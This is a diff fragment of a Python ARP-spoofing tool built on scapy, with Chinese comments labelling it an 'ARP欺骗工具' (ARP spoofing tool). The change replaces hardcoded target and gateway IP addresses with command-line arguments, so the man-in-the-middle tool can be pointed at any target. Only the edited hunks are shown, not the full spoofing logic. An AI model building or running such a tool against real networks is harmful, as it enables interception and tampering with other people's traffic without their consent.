@@ -1,6 +1,7 @@
 #arp_spoof欺骗
 import scapy.all as scapy
 import time
+import argparse
 
 # 发送ARP响应包
 def spoof(target_ip, target_mac, gateway_ip):
@@ -51,6 +52,15 @@ def arp_spoof(target_ip, gateway_ip):
         print("网络已恢复正常。")
 
 if __name__ == "__main__":
-    target_ip = "192.168.1.10"  # 目标IP
-    gateway_ip = "192.168.1.1"  # 网关IP
+    # 创建ArgumentParser对象
+    parser = argparse.ArgumentParser(description="ARP欺骗工具")
+    # 添加参数
+    parser.add_argument('-t', '--target', required=True, help='目标IP地址')
+    parser.add_argument('-r', '--router', required=True, help='网关IP地址')
+    
+    # 解析参数
+    args = parser.parse_args()
+    
+    target_ip = args.target  # 目标IP
+    gateway_ip = args.router  # 网关IP
     arp_spoof(target_ip, gateway_ip)
